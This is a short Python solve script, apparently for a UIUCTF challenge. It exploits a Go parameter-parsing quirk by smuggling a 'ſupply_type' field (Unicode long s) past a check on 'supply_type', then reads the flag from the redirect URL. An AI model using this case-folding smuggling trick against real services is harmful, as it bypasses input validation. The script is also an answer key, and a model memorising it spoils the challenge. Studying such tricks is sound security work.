#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import requests
from urllib.parse import unquote, urlparse, parse_qs

url = "http://127.0.0.1:8080"

r = requests.post(f'{url}/create_shipment', data={
  "supply_type": "anything can go here besides flag",
  # https://blog.trailofbits.com/2025/06/17/unexpected-security-footguns-in-gos-parsers/#:~:text=You%20can%20even%20use%20Unicode%20characters!
  "ſupply_type": 'flag'
})

parsed = urlparse(r.url)
query = parse_qs(parsed.query)
flag = query.get('status', [None])[0]
if flag and flag.startswith('uiuctf'):
  print("Flag:", unquote(flag))
  exit(0)
else:
  print("Failed to find flag.")
  exit(1)